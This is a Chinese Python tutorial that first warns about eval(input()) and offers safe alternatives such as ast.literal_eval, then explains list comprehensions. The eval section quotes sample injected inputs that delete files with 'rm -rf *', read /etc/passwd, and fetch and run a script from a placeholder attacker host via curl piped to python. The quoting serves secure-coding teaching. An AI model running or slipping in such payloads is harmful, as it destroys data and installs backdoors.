一. eval():将字符串作为 Python 代码执行，并返回表达式的结果。

eval(input()) 极其危险，因为它会执行用户输入的任意代码：
1. 系统命令执行
输入以下内容会删除当前目录下的所有文件（Linux/macOS）：

__import__('os').system('rm -rf *')
2. 数据泄露
输入以下内容会读取系统敏感文件：

open('/etc/passwd').read()  # Linux 系统用户信息
3. 代码注入攻击
攻击者可利用此漏洞远程控制服务器，例如：

__import__('subprocess').getoutput('curl hacker.com/backdoor.py | python')
安全替代方案
根据具体需求选择更安全的方法：
1. 仅处理数字输入
使用 int() 或 float() 转换输入，避免执行代码：

num = int(input("请输入数字："))  # 只接受整数
print(num * 2)

2. 解析特定格式
手动解析输入，而非执行：

# 安全解析 "a,b" 格式的两个数字
user_input = input("请输入两个数（用逗号分隔）：")
a, b = map(int, user_input.split(','))
print(f"和：{a + b}")

3. 使用 ast.literal_eval()
仅解析合法的 Python 字面量（列表、字典、数字等）：

import ast
data = ast.literal_eval(input("请输入列表或字典："))
print(data)

安全输入：[1, 2, 3] 或 {'name': 'Alice'}
危险输入：__import__('os').system('ls')（会报错）

二.列表推导算法

在 Python 中，列表推导式（List Comprehension） 是一种简洁高效的创建列表的语法。它允许你通过现有可迭代对象（如列表、元组、字符串等）快速生成新列表，无需编写传统的 for 循环。以下是关于列表推导式的详细介绍：
基本语法

[表达式 for 变量 in 可迭代对象 [条件]]

表达式：用于计算新列表的元素。
for 变量 in 可迭代对象：遍历原可迭代对象的每个元素。
[条件]（可选）：过滤元素的条件表达式。
核心功能
1. 基础列表推导
生成 0 到 4 的平方列表：

squares = [x**2 for x in range(5)]
print(squares)  # 输出：[0, 1, 4, 9, 16]
2. 带条件过滤
生成 0 到 9 中的偶数列表：

evens = [x for x in range(10) if x % 2 == 0]
print(evens)  # 输出：[0, 2, 4, 6, 8]
3. 嵌套循环
将二维列表展平为一维列表：

matrix = [[1, 2], [3, 4]]
flattened = [num for row in matrix for num in row]
print(flattened)  # 输出：[1, 2, 3, 4]
4. 条件表达式（三元运算符）
将列表中的负数替换为 0，正数保留：

numbers = [-1, 2, -3, 4]
result = [x if x >= 0 else 0 for x in numbers]
print(result)  # 输出：[0, 2, 0, 4]
与传统循环的对比
传统 for 循环：

squares = []
for x in range(5):
    squares.append(x**2)

列表推导式：

squares = [x**2 for x in range(5)]

优势：

代码更简洁、易读。
执行效率更高（底层优化）。
常见应用场景
1. 数据转换
将字符串列表转为长度列表：

words = ["apple", "banana", "cherry"]
lengths = [len(word) for word in words]
print(lengths)  # 输出：[5, 6, 6]
2. 过滤数据
筛选出列表中的数字元素：

mixed = [1, "a", 2, "b", 3]
numbers = [x for x in mixed if isinstance(x, int)]
print(numbers)  # 输出：[1, 2, 3]
3. 生成笛卡尔积
生成两个列表的所有组合：

letters = ['a', 'b']
numbers = [1, 2]
pairs = [(l, n) for l in letters for n in numbers]
print(pairs)  # 输出：[('a', 1), ('a', 2), ('b', 1), ('b', 2)]
嵌套列表推导式
创建矩阵（二维列表）：

matrix = [[i*j for j in range(3)] for i in range(3)]
print(matrix)  # 输出：[[0, 0, 0], [0, 1, 2], [0, 2, 4]]

注意事项
避免过度复杂：嵌套层级过多或表达式过长会降低可读性。
内存消耗：一次性生成整个列表，大数据量时可能占用较多内存。
替代方案：使用生成器表达式（圆括号）：

gen = (x**2 for x in range(1000))  # 惰性生成，节省内存

顺序问题：嵌套循环的顺序与传统 for 循环一致：

# 等价于
result = []
for i in range(3):
    for j in range(3):
        result.append(i*j)
